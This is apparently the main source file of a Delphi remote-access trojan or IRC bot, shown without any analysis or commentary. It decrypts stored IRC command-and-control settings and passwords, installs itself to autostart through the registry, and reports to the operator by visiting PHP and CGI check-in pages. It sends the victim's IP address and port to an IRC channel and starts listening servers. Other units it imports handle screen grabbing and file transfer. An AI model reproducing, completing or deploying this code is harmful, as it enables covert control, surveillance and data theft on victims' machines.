   PROGRAM SERV;
   uses
     SHELLAPI,
     TLHELP32,
     WINDOWS,
     MESSAGES,
     WINSOCK,
     pngimage in 'pngimage.pas',
     pnglang in 'pnglang.pas',
     pngzlib in 'pngzlib.pas',
     Unit1 in 'Unit1.pas',
     untScreenGrab in 'untScreenGrab.pas',
     AllStrings in 'AllStrings.pas',
     Encryption in 'Encryption.pas',
     ServersUnit in 'ServersUnit.pas',
     untFunctions in 'untFunctions.pas',
     untTransfer in 'untTransfer.pas';

   {$IMAGEBASE $13140000}

   PROCEDURE MAIN;
   BEGIN
   LoadReg;(*
   IF (IRC_NICK1 = '^') or (IRC_NICK1 = '')                   THEN IRC_NICK1 := DECRYPT(STRIPDATA(I_NICK1));
   IF (IRC_NICK2 = '^') or (IRC_NICK2 = '')                   THEN IRC_NICK2 := DECRYPT(STRIPDATA(I_NICK2));
   IF (IRC_CHAN1 = '^') or (IRC_CHAN1 = '')                   THEN IRC_CHAN1 := DECRYPT(STRIPDATA(I_CHAN1));
   IF (IRC_CHAN2 = '^') or (IRC_CHAN2 = '')                   THEN IRC_CHAN2 := DECRYPT(STRIPDATA(I_CHAN2));
   IF (IRC_SERV1 = '^') or (IRC_SERV1 = '')                   THEN IRC_SERV1 := DECRYPT(STRIPDATA(I_SERV1));
   IF (IRC_SERV2 = '^') or (IRC_SERV2 = '')                   THEN IRC_SERV2 := DECRYPT(STRIPDATA(I_SERV2));
   IF (IRC_CKEY1 = '^') or (IRC_CKEY1 = '')                   THEN IRC_CKEY1 := DECRYPT(STRIPDATA(I_CKEY1));
   IF (IRC_CKEY2 = '^') or (IRC_CKEY2 = '')                   THEN IRC_CKEY2 := DECRYPT(STRIPDATA(I_CKEY2));
   IF (IRC_MASTER1 = '^') or (IRC_MASTER1 = '')               THEN IRC_MASTER1 := DECRYPT(STRIPDATA(I_MAST1));
   IF (IRC_MASTER2 = '^') or (IRC_MASTER2 = '')               THEN IRC_MASTER2 := DECRYPT(STRIPDATA(I_MAST2));
   IF (SERV_TRAFFICP = '^') or (SERV_TRAFFICP = '')           THEN SERV_TRAFFICP := DECRYPT(STRIPDATA(S_PORT1));
   IF (SERV_TRANSP = '^') or (SERV_TRANSP = '')               THEN SERV_TRANSP := DECRYPT(STRIPDATA(S_PORT2));
   IF (SERV_AUTOSTART = '^') or (SERV_AUTOSTART = '')         THEN SERV_AUTOSTART := DECRYPT(STRIPDATA(S_START));
   IF (SERV_REGKEY = '^') or (SERV_REGKEY = '')               THEN SERV_REGKEY := DECRYPT(STRIPDATA(S_REGKEY));
   IF (SERV_REGVALUE = '^') or (SERV_REGVALUE = '')           THEN SERV_REGVALUE := DECRYPT(STRIPDATA(S_RVALUE));
   IF (SERV_WINNAME = '^') or (SERV_WINNAME = '')             THEN SERV_WINNAME := DECRYPT(STRIPDATA(S_WNAME));
   IF (SERV_SYSNAME = '^') or (SERV_SYSNAME = '')             THEN SERV_SYSNAME := DECRYPT(STRIPDATA(S_SNAME));
   IF (SERV_CGI = '^') or (SERV_CGI = '')                     THEN SERV_CGI := DECRYPT(STRIPDATA(S_CGI));
   IF (SERV_PHP = '^') or (SERV_PHP = '')                     THEN SERV_PHP := DECRYPT(STRIPDATA(S_PHP));
   IF (PASSWORD = '^') or (PASSWORD = '')                     THEN PASSWORD := DECRYPT(STRIPDATA(S_PASSW));
   IF (SERV_REGWAY = '^') or (SERV_REGWAY = '')               THEN SERV_REGWAY := DECRYPT(STRIPDATA(S_REGWAY));
   SaveReg;*)
   IF (DECRYPT(serv_php) <> '') and (DECRYPT(serv_php) <> '^') then
    VisitPage(0,pchar(DECRYPT(serv_php)),'',0,0);
   IF (DECRYPT(serv_cgi) <> '') and (DECRYPT(serv_cgi) <> '^') then
    VisitPage(0,pchar(DECRYPT(serv_cgi)),'',0,0);
   IF SERV_REGKEY = '^' THEN SERV_AUTOSTART := 'Z';
   IF SERV_REGVALUE = '^' THEN SERV_AUTOSTART := 'Z';
   IF SERV_REGWAY = '^' THEN SERV_AUTOSTART := 'Z';
   SetAutoStart;

     IRCSERV := DECRYPT(IRC_SERV1);
     IRCCHAN := DECRYPT(IRC_CHAN1);
     IRCKEY :=  DECRYPT(IRC_CKEY1);
     IRCNICK := DECRYPT(IRC_NICK1);

     IRCSERV2 := DECRYPT(IRC_SERV2);
     IRCCHAN2 := DECRYPT(IRC_CHAN2);
     IRCKEY2 :=  DECRYPT(IRC_CKEY2);
     IRCNICK2 := DECRYPT(IRC_NICK2);

     MYPASS := DECRYPT(PASSWORD);

   CREATETHREAD(NIL, 0, @SERVER1_START, NIL, 0, A);
   sleep(400);
   IRC_MSG := '[IP: '+ IPTOSTR(MY_IP_ADDRESS)+'] [PORT: '+DECRYPT(SERV_TRAFFICP)+']';
   //CreateThread(nil,0,@IRCBOT,nil,0,a);
   server2_start;
   END;

   procedure HandleEvents(reason:word);
   begin
    case reason of
     DLL_PROCESS_ATTACH:begin
      messagebox(0,'a','a',mb_ok);
      CreateMutexA(NIL, TRUE, 'DENIAL');
      if (GetLastError() <> ERROR_ALREADY_EXISTS) Then
       BeginThread(nil,0,TFNThreadStartRoutine(@Main),nil,0,Dummy);
     end;
     DLL_PROCESS_DETACH: ExitProcess(0);
    end;
   end;

   begin
   //  DLLProc := @HandleEvents;
   //  HandleEvents(DLL_PROCESS_ATTACH);
   main;
   END.
